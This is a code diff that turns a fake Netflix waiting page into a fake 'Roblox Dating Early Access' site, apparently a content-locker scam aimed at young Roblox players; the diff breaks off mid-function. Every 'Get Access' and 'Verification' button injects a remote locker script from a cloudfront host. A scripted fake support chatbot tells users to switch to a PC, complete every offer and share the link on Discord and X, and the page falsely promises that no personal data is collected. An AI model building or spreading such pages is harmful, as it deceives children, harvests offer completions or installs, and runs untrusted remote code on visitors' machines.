@@ -1,71 +1,1176 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Netflix</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background-color: #141414;
-      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      text-align: center;
-    }
-
-    .logo {
-      width: 150px;
-      margin-bottom: 40px;
-    }
-
-    .message {
-      font-size: 1.5rem;
-      max-width: 600px;
-      margin-bottom: 30px;
-      line-height: 1.6;
-    }
-
-    .note {
-      font-size: 1rem;
-      color: #bbbbbb;
-      max-width: 600px;
-      margin-bottom: 40px;
-    }
-
-    .button {
-      background-color: #e50914;
-      color: white;
-      border: none;
-      padding: 15px 30px;
-      font-size: 1.2rem;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      text-decoration: none;
-    }
-
-    .button:hover {
-      background-color: #f6121d;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox Dating - Early Access | EarlyRoblox.com</title>
+    <link href="https://fonts.googleapis.com/css2?family=Gotham+SSm:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --roblox-dark: #1a1e21;
+            --roblox-darker: #121416;
+            --roblox-blue: #00a2ff;
+            --roblox-dark-blue: #0088cc;
+            --roblox-red: #ff3c28;
+            --roblox-card: #23282d;
+            --roblox-border: #2d3238;
+            --roblox-text: #e8e8e8;
+            --roblox-light-text: #a1a1a1;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Gotham SSm', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background-color: var(--roblox-darker);
+            color: var(--roblox-text);
+            line-height: 1.6;
+            overflow-x: hidden;
+            touch-action: manipulation;
+        }
+        
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        .navbar {
+            background: var(--roblox-dark);
+            height: 70px;
+            display: flex;
+            align-items: center;
+            padding: 0 5%;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid var(--roblox-border);
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+        
+        .navbar.scrolled {
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo {
+            height: 28px;
+            filter: brightness(0) invert(1);
+            transition: transform 0.3s ease;
+        }
+        
+        .logo:hover {
+            transform: scale(1.05);
+        }
+        
+        .beta-tag {
+            background: var(--roblox-red);
+            color: white;
+            font-size: 12px;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 25px;
+            margin-left: auto;
+        }
+        
+        .nav-link {
+            color: var(--roblox-text);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+        }
+        
+        .nav-link:hover {
+            color: var(--roblox-blue);
+        }
+        
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--roblox-blue);
+            transition: width 0.3s ease;
+        }
+        
+        .nav-link:hover::after {
+            width: 100%;
+        }
+        
+        .main {
+            margin-top: 70px;
+            padding: 60px 5%;
+        }
+        
+        .hero {
+            text-align: center;
+            margin-bottom: 50px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            animation: fadeInUp 0.8s ease-out;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        h1 {
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, var(--roblox-blue), #72cc18);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .subtitle {
+            font-size: 18px;
+            color: var(--roblox-light-text);
+            margin-bottom: 30px;
+            line-height: 1.7;
+        }
+        
+        .early-access-desc {
+            background: var(--roblox-card);
+            border-radius: 8px;
+            padding: 30px;
+            margin: 40px auto;
+            max-width: 800px;
+            border-left: 4px solid var(--roblox-blue);
+            animation: fadeIn 0.8s ease-out 0.2s both;
+        }
+        
+        .early-access-desc h2 {
+            color: var(--roblox-blue);
+            margin-bottom: 15px;
+        }
+        
+        .early-access-desc p {
+            margin-bottom: 15px;
+        }
+        
+        .early-access-desc ul {
+            margin-left: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .card {
+            background: var(--roblox-card);
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid var(--roblox-border);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            animation: fadeIn 0.8s ease-out;
+            animation-fill-mode: both;
+        }
+        
+        .card:nth-child(1) { animation-delay: 0.1s; }
+        .card:nth-child(2) { animation-delay: 0.2s; }
+        .card:nth-child(3) { animation-delay: 0.3s; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .card:hover {
+            transform: translateY(-5px) scale(1.01);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+        }
+        
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        h2::before {
+            content: '';
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--roblox-blue);
+            border-radius: 50%;
+        }
+        
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 14px 32px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            border: none;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(255,255,255,0.1), rgba(255,255,255,0));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .btn:hover::after {
+            opacity: 1;
+        }
+        
+        .btn-primary {
+            background: white;
+            color: black;
+            font-weight: 700;
+            box-shadow: 0 4px 15px rgba(255,255,255,0.2);
+        }
+        
+        .btn-primary:hover {
+            background: #e6e6e6;
+            transform: translateY(-3px) scale(1.03);
+            box-shadow: 0 8px 20px rgba(255, 255, 255, 0.3);
+        }
+        
+        .btn-secondary {
+            background: transparent;
+            color: var(--roblox-blue);
+            border: 1px solid var(--roblox-blue);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(0, 162, 255, 0.1);
+            transform: translateY(-3px);
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+            justify-content: center;
+        }
+        
+        .share-section {
+            background: var(--roblox-card);
+            border-radius: 8px;
+            padding: 25px;
+            margin: 30px 0;
+            text-align: center;
+            border: 1px dashed var(--roblox-blue);
+            transition: all 0.4s ease;
+        }
+        
+        .share-section:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        
+        .share-title {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: var(--roblox-blue);
+        }
+        
+        .share-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .share-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+        
+        .share-discord {
+            background: #5865F2;
+            color: white;
+        }
+        
+        .share-x {
+            background: #000000;
+            color: white;
+        }
+        
+        .share-copy {
+            background: var(--roblox-dark);
+            color: var(--roblox-text);
+            border: 1px solid var(--roblox-blue);
+        }
+        
+        .share-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            opacity: 0.9;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin: 50px 0;
+        }
+        
+        .feature {
+            background: var(--roblox-card);
+            border-radius: 8px;
+            padding: 25px;
+            border: 1px solid var(--roblox-border);
+            transition: all 0.4s ease;
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: var(--roblox-blue);
+            transition: transform 0.3s ease;
+        }
+        
+        .feature:hover .feature-icon {
+            transform: scale(1.2);
+        }
+        
+        .feature h3 {
+            color: white;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .chatbot-container {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 1000;
+        }
+        
+        .chatbot-toggle {
+            background: var(--roblox-blue);
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            touch-action: manipulation;
+        }
+        
+        .chatbot-toggle:hover {
+            transform: scale(1.1) rotate(5deg);
+            box-shadow: 0 6px 16px rgba(0, 162, 255, 0.4);
+        }
+        
+        .chatbot-window {
+            position: fixed;
+            bottom: 80px;
+            right: 30px;
+            width: 350px;
+            max-width: 90vw;
+            background: var(--roblox-card);
+            border-radius: 12px;
+            border: 1px solid var(--roblox-blue);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+            overflow: hidden;
+            display: none;
+            flex-direction: column;
+            max-height: 60vh;
+            transform: translateY(20px);
+            opacity: 0;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            -webkit-overflow-scrolling: touch;
+            z-index: 1001;
+        }
+        
+        .chatbot-window.active {
+            display: flex;
+            transform: translateY(0);
+            opacity: 1;
+        }
+        
+        .chatbot-header {
+            background: var(--roblox-dark);
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--roblox-border);
+        }
+        
+        .chatbot-body {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        .chatbot-message {
+            max-width: 80%;
+            padding: 10px 15px;
+            border-radius: 18px;
+            font-size: 14px;
+            line-height: 1.5;
+            animation: fadeIn 0.3s ease-out;
+            word-wrap: break-word;
+        }
+        
+        .typing-indicator {
+            display: flex;
+            gap: 5px;
+            padding: 10px 15px;
+        }
+        
+        .typing-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--roblox-blue);
+            border-radius: 50%;
+            opacity: 0.4;
+            animation: typingAnimation 1.4s infinite ease-in-out;
+        }
+        
+        .typing-dot:nth-child(1) { animation-delay: 0s; }
+        .typing-dot:nth-child(2) { animation-delay: 0.2s; }
+        .typing-dot:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes typingAnimation {
+            0%, 60%, 100% { transform: translateY(0); opacity: 0.6; }
+            30% { transform: translateY(-5px); opacity: 1; }
+        }
+        
+        .bot-message {
+            background: var(--roblox-dark);
+            align-self: flex-start;
+            border-bottom-left-radius: 5px;
+        }
+        
+        .user-message {
+            background: var(--roblox-blue);
+            color: white;
+            align-self: flex-end;
+            border-bottom-right-radius: 5px;
+        }
+        
+        .chatbot-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .chatbot-option {
+            background: rgba(0, 162, 255, 0.1);
+            padding: 10px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 14px;
+            border: 1px solid rgba(0, 162, 255, 0.3);
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            touch-action: manipulation;
+        }
+        
+        .chatbot-option:hover {
+            background: rgba(0, 162, 255, 0.2);
+            transform: translateX(5px);
+        }
+        
+        .help-notification {
+            position: fixed;
+            bottom: 110px;
+            right: 30px;
+            background: var(--roblox-blue);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 6px;
+            font-size: 14px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            z-index: 1001;
+            display: none;
+            animation: slideIn 0.5s ease-out;
+            transform: translateX(20px);
+            opacity: 0;
+            max-width: 80%;
+            user-select: none;
+        }
+        
+        .help-notification.show {
+            display: block;
+            transform: translateX(0);
+            opacity: 1;
+        }
+        
+        .help-notification::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            right: 20px;
+            border-width: 10px 10px 0;
+            border-style: solid;
+            border-color: var(--roblox-blue) transparent transparent;
+        }
+        
+        @keyframes slideIn {
+            from {
+                transform: translateX(20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(5px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .modal.active {
+            opacity: 1;
+        }
+        
+        .modal-content {
+            background: var(--roblox-card);
+            border-radius: 8px;
+            width: 90%;
+            max-width: 600px;
+            max-height: 90vh;
+            overflow-y: auto;
+            padding: 30px;
+            position: relative;
+            transform: translateY(20px);
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            border: 1px solid var(--roblox-blue);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        .modal.active .modal-content {
+            transform: translateY(0);
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--roblox-light-text);
+            transition: all 0.3s ease;
+        }
+        
+        .close-btn:hover {
+            color: var(--roblox-blue);
+            transform: rotate(90deg);
+        }
+        
+        .footer {
+            background: var(--roblox-dark);
+            padding: 40px 5%;
+            text-align: center;
+            border-top: 1px solid var(--roblox-border);
+            animation: fadeIn 0.8s ease-out;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-link {
+            color: var(--roblox-light-text);
+            text-decoration: none;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .footer-link::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: var(--roblox-blue);
+            transition: width 0.3s ease;
+        }
+        
+        .footer-link:hover {
+            color: var(--roblox-blue);
+        }
+        
+        .footer-link:hover::after {
+            width: 100%;
+        }
+        
+        .disclaimer {
+            color: var(--roblox-light-text);
+            font-size: 12px;
+            margin-top: 20px;
+            opacity: 0.7;
+        }
+        
+        @media (max-width: 768px) {
+            .nav-links {
+                gap: 15px;
+            }
+            
+            .btn-group, .share-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .btn, .share-btn {
+                width: 100%;
+            }
+            
+            h1 {
+                font-size: 32px;
+            }
+            
+            .chatbot-container {
+                bottom: 20px;
+                right: 20px;
+            }
+            
+            .chatbot-window {
+                width: calc(100% - 40px);
+                right: 20px;
+                max-height: 50vh;
+                bottom: 70px;
+            }
+            
+            .help-notification {
+                bottom: 80px;
+                right: 20px;
+                max-width: calc(100% - 40px);
+            }
+            
+            .chatbot-toggle {
+                width: 50px;
+                height: 50px;
+            }
+            
+            .chatbot-toggle svg {
+                width: 20px;
+                height: 20px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .chatbot-message {
+                max-width: 90%;
+            }
+            
+            .chatbot-option {
+                padding: 12px 15px;
+            }
+            
+            .help-notification {
+                font-size: 13px;
+                padding: 8px 12px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo" />
-
-  <div class="message">
-    Due to high demand, we’re currently full. Please click the button below and try again.
-  </div>
-
-  <div class="note">
-    Make sure to keep the app you downloaded installed for at least 1 hour to ensure there are no issues with access.
-  </div>
-
-  <a class="button" href="https://100grab.com">Try Again</a>
+    <!-- ROBLOX NAVBAR -->
+    <nav class="navbar">
+        <div class="logo-container">
+            <img src="https://www.edigitalagency.com.au/wp-content/uploads/roblox-logo-white-png-transparent.png" alt="Roblox Logo" class="logo">
+            <span class="beta-tag">Beta</span>
+        </div>
+        <div class="nav-links">
+            <a class="nav-link" onclick="toggleChatbot()">Help</a>
+            <a class="nav-link" onclick="openModal()">Quick Help</a>
+            <a class="nav-link" onclick="toggleChatbot(); selectChatOption(5)">Contact</a>
+        </div>
+    </nav>
+    
+    <!-- MAIN CONTENT -->
+    <main class="main">
+        <section class="hero">
+            <h1>Roblox Dating Early Access</h1>
+            <p class="subtitle">
+                Get exclusive early access to new Roblox dating features before public release. 
+                Limited spots available - join now before registration closes!
+            </p>
+            
+            <div class="btn-group">
+                <button class="btn btn-primary" onclick="loadLocker()">
+                    Get Access Now
+                </button>
+                <button class="btn btn-secondary" onclick="openModal()">
+                    How It Works
+                </button>
+            </div>
+        </section>
+        
+        <!-- EARLY ACCESS DESCRIPTION -->
+        <section class="early-access-desc">
+            <h2>How To Get Early Access</h2>
+            <p>Apply now to be among the first to test exciting new Roblox dating features before they're available to everyone.</p>
+            
+            <p>By joining the beta program, you'll get:</p>
+            <ul>
+                <li>Exclusive access to experimental dating features</li>
+                <li>Ability to provide feedback that shapes the final product</li>
+                <li>Special rewards only available to beta testers</li>
+                <li>Early preview of upcoming social tools</li>
+            </ul>
+            
+            <p>The application process takes less than 1 minute and helps us verify you're a real player.</p>
+        </section>
+        
+        <section class="card">
+            <h2>Beta Program Benefits</h2>
+            <p>
+                Early access members get exclusive features not available to the public:
+            </p>
+            
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon">🔓</div>
+                    <h3>Exclusive Features</h3>
+                    <p>Test new tools months before public release with special privileges</p>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">💬</div>
+                    <h3>Direct Influence</h3>
+                    <p>Your feedback helps shape the final product for all players</p>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">🎁</div>
+                    <h3>Special Rewards</h3>
+                    <p>Earn exclusive badges and items for your participation</p>
+                </div>
+            </div>
+        </section>
+        
+        <!-- SHARE SECTION -->
+        <section class="share-section">
+            <h3 class="share-title">Invite Friends & Get Bonus Rewards</h3>
+            <p>Share this page with friends to help them get early access too!</p>
+            
+            <div class="share-buttons">
+                <button class="share-btn share-discord" onclick="shareOnDiscord()">
+                    <i class="fab fa-discord"></i> Share on Discord
+                </button>
+                <button class="share-btn share-x" onclick="shareOnX()">
+                    <i class="fab fa-x-twitter"></i> Share on X
+                </button>
+                <button class="share-btn share-copy" onclick="copyLink()">
+                    <i class="fas fa-link"></i> Copy Link
+                </button>
+            </div>
+        </section>
+        
+        <section class="card" style="text-align: center;">
+            <h2>Ready to Join?</h2>
+            <p>
+                Registration may close soon as we reach capacity. Secure your spot now.
+            </p>
+            
+            <button class="btn btn-primary" onclick="loadLocker()" style="margin-top: 30px; padding: 16px 40px;">
+                Start Verification
+            </button>
+        </section>
+    </main>
+    
+    <!-- NEED HELP NOTIFICATION -->
+    <div class="help-notification" id="helpNotification">
+        Need help? Click here to chat with us!
+    </div>
+    
+    <!-- CHATBOT -->
+    <div class="chatbot-container">
+        <div class="chatbot-toggle" onclick="toggleChatbot()">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+            </svg>
+        </div>
+        <div class="chatbot-window" id="chatbotWindow">
+            <div class="chatbot-header">
+                <h3>Roblox Beta Assistant</h3>
+            </div>
+            <div class="chatbot-body" id="chatbotBody">
+                <div class="chatbot-message bot-message">
+                    Hello! I'm here to help you get early access to Roblox dating features. How can I assist you?
+                </div>
+                <div class="chatbot-options">
+                    <div class="chatbot-option" onclick="selectChatOption(1)">Why do I need to verify?</div>
+                    <div class="chatbot-option" onclick="selectChatOption(2)">How does the process work?</div>
+                    <div class="chatbot-option" onclick="selectChatOption(3)">I'm having technical issues</div>
+                    <div class="chatbot-option" onclick="selectChatOption(4)">Does this work on mobile?</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- MODAL -->
+    <div class="modal" id="tutorialModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">&times;</span>
+            <h2>How It Works</h2>
+            
+            <p>
+                To ensure server stability and prevent abuse, we require a quick verification through 
+                our trusted partner network.
+            </p>
+            
+            <h3 style="margin-top: 25px; margin-bottom: 15px;">Why Verification Is Required:</h3>
+            <ul style="margin-left: 20px; margin-bottom: 25px;">
+                <li>Confirm you're a real Roblox player</li>
+                <li>Maintain server performance</li>
+                <li>Prevent automated signups</li>
+            </ul>
+            
+            <div style="background: rgba(0, 162, 255, 0.1); padding: 15px; border-radius: 6px; border-left: 3px solid var(--roblox-blue); margin-bottom: 20px;">
+                <p><strong>Note:</strong> No personal information is collected. We only verify your status as a real user.</p>
+            </div>
+            
+            <button class="btn btn-primary" onclick="loadLocker()" style="width: 100%; padding: 14px; margin-top: 20px;">
+                Start Verification Now
+            </button>
+        </div>
+    </div>
+    
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Terms</a>
+            <a href="#" class="footer-link">Privacy</a>
+            <a href="#" class="footer-link" onclick="toggleChatbot()">Help</a>
+            <a href="#" class="footer-link" onclick="toggleChatbot(); selectChatOption(5)">Contact</a>
+        </div>
+        <p class="disclaimer">
+            © 2023 EarlyRoblox.com | This is not an official Roblox site. Roblox and the Roblox logo are registered trademarks of Roblox Corporation.
+        </p>
+    </footer>
+    
+    <script>
+        var gwwOt_kKm_JqBzbc={"it":4533868,"key":"36601"};
+        
+        // Scroll effect for navbar
+        window.addEventListener('scroll', function() {
+            const navbar = document.querySelector('.navbar');
+            if (window.scrollY > 10) {
+                navbar.classList.add('scrolled');
+            } else {
+                navbar.classList.remove('scrolled');
+            }
+        });
+        
+        function loadLocker() {
+            if (!window._Cm) {
+                const s = document.createElement('script');
+                s.src = 'https://dlk457skl57zp.cloudfront.net/0b63732.js';
+                s.onload = function() {
+                    if (typeof _Cm === 'function') _Cm();
+                };
+                document.body.appendChild(s);
+            } else {
+                _Cm();
+            }
+        }
+        
+        function openModal() {
+            const modal = document.getElementById('tutorialModal');
+            modal.style.display = 'flex';
+            setTimeout(() => modal.classList.add('active'), 10);
+        }
+        
+        function closeModal() {
+            const modal = document.getElementById('tutorialModal');
+            modal.classList.remove('active');
+            setTimeout(() => modal.style.display = 'none', 300);
+        }
+        
+        function toggleChatbot() {
+            const chatbot = document.getElementById('chatbotWindow');
+            const body = document.getElementById('chatbotBody');
+            
+            if (chatbot.classList.contains('active')) {
+                // Close the chatbot
+                chatbot.classList.remove('active');
+                setTimeout(() => {
+                    chatbot.style.display = 'none';
+                }, 300);
+            } else {
+                // Open the chatbot
+                chatbot.style.display = 'flex';
+                setTimeout(() => {
+                    chatbot.classList.add('active');
+                    // Scroll to bottom after opening
+                    setTimeout(() => {
+                        body.scrollTop = body.scrollHeight;
+                    }, 100);
+                }, 10);
+            }
+            hideHelpNotification();
+        }
+        
+        // Show help notification after delay
+        setTimeout(() => {
+            const helpNotification = document.getElementById('helpNotification');
+            helpNotification.classList.add('show');
+            
+            // Click handler for notification
+            helpNotification.addEventListener('click', function() {
+                toggleChatbot();
+                hideHelpNotification();
+            });
+        }, 10000); // Show after 10 seconds
+        
+        function hideHelpNotification() {
+            const helpNotification = document.getElementById('helpNotification');
+            helpNotification.classList.remove('show');
+        }
+        
+        function selectChatOption(option) {
+            const chatbotBody = document.getElementById('chatbotBody');
+            
+            // Clear options
+            const options = document.querySelectorAll('.chatbot-options');
+            options.forEach(opt => opt.remove());
+            
+            // Add user message
+            let userMessage = '';
+            if (option === 1) {
+                userMessage = 'Why do I need to verify?';
+            } else if (option === 2) {
+                userMessage = 'How does the process work?';
+            } else if (option === 3) {
+                userMessage = "I'm having technical issues";
+            } else if (option === 4) {
+                userMessage = "Does this work on mobile?";
+            } else if (option === 5) {
+                userMessage = "I need to contact support";
+            } else if (option === 6) {
+                userMessage = "What if it doesn't work?";
+            } else {
+                userMessage = "I have another question";
+            }
+            
+            const userMsgDiv = document.createElement('div');
+            userMsgDiv.className = 'chatbot-message user-message';
+            userMsgDiv.textContent = userMessage;
+            chatbotBody.appendChild(userMsgDiv);
+            
+            // Add typing indicator
+            const typingDiv = document.createElement('div');
+            typingDiv.className = 'typing-indicator';
+            typingDiv.innerHTML = `
+                <div class="typing-dot"></div>
+                <div class="typing-dot"></div>
+                <div class="typing-dot"></div>
+            `;
+            chatbotBody.appendChild(typingDiv);
+            chatbotBody.scrollTop = chatbotBody.scrollHeight;
+            
+            // Add bot response after delay
+            setTimeout(() => {
+                typingDiv.remove();
+                
+                const botMsgDiv = document.createElement('div');
+                botMsgDiv.className = 'chatbot-message bot-message';
+                
+                if (option === 1) {
+                    botMsgDiv.innerHTML = `
+                        Verification helps us:<br><br>
+                        • Keep bots and fake accounts out of the beta<br>
+                        • Ensure servers run smoothly for real players<br>
+                        • Give everyone equal access to features<br><br>
+                        <em>It takes less than 1 minute and requires no personal info!</em>
+                    `;
+                } else if (option === 2) {
+                    botMsgDiv.innerHTML = `
+                        Here's how it works:<br><br>
+                        1. Click "Get Access Now"<br>
+                        2. Complete our quick verification<br>
+                        3. Get instant beta access!<br><br>
+                        <strong>Mobile note:</strong> For best results, use a PC browser at <strong>earlyroblox.com</strong>
+                    `;
+                } else if (option === 3) {
+                    botMsgDiv.innerHTML = `
+                        Try these steps:<br><br>
+                        1. Refresh your browser<br>
+                        2. Try a different browser (Chrome/Firefox work best)<br>
+                        3. Switch to a PC if you're on mobile<br>
+                        4. Share the link with friends to see if it works for them<br><br>
+                        Still stuck? The verification works best on <strong>Windows/Mac</strong>.
+                    `;
+                } else if (option === 4) {
+                    botMsgDiv.innerHTML = `
+                        Mobile compatibility:<br><br>
+                        • Mobile <strong>may work</strong> but isn't guaranteed<br>
+                        • For best results, use a PC at <strong>earlyroblox.com</strong><br>
+                        • If mobile fails, try on a computer<br><br>
+                        <em>Complete all options if one doesn't work - sometimes it takes a few tries!</em>
+                    `;
+                } else if (option === 5) {
+                    botMsgDiv.innerHTML = `
+                        For support:<br><br>
+                        • Try the verification on a PC at <strong>earlyroblox.com</strong><br>
+                        • Ensure you have a stable internet connection<br>
+                        • The process typically completes in under 1 minute<br><br>
+                        If issues persist, please try again later or share with friends to test.
+                    `;
+                } else if (option === 6) {
+                    botMsgDiv.innerHTML = `
+                        If it's not working:<br><br>
+                        1. Try all available verification options<br>
+                        2. Complete all steps that appear<br>
+                        3. Share with friends to see if it works for them<br>
+                        4. Try on a different device (PC recommended)<br><br>
+                        <strong>Remember:</strong> Sometimes it takes a few tries to complete successfully.
+                    `;
+                } else {
+                    botMsgDiv.innerHTML = `
+                        For any other questions:<br><br>
+                        • Try all verification options that appear<br>
+                        • Complete all steps in the process<br>
+                        • The system works best on PC at <strong>earlyroblox.com</strong><br>
+                        • Share with friends to test different devices<br><br>
+                        Most issues can be resolved by trying different options or devices.
+                    `;
+                }
+                
+                chatbotBody.appendChild(botMsgDiv);
+                
+                // Add new options
+                const newOptions = document.createElement('div');
+                newOptions.className = 'chatbot-options';
+                newOptions.innerHTML = `
+                    <div class="chatbot-option" onclick="selectChatOption(1)">Why verify?</div>
+                    <div class="chatbot-option" onclick="selectChatOption(4)">Mobile issues</div>
+                    <div class="chatbot-option" onclick="window.open('https://earlyroblox.com', '_blank')">Open on PC</div>
+                    <div class="chatbot-option" onclick="selectChatOption(6)">Still not working?</div>
+                `;
+                chatbotBody.appendChild(newOptions);
+                chatbotBody.scrollTop = chatbotBody.scrollHeight;
+            }, 1500); // Simulate AI thinking time
+        }
+        
+        /* SHARE FUNCTIONS */
+        function shareOnDiscord() {
+            const url = encodeURIComponent("https://earlyroblox.com");
+            const text = encodeURIComponent("Check out this exclusive Roblox Dating Beta access! Join before spots fill up: ");
+            window.open(`https://discord.com/channels/@me?text=${text}${url}`, '_blank');
+        }
+        
+        function shareOnX() {
+            const url = encodeURIComponent("https://earlyroblox.com");
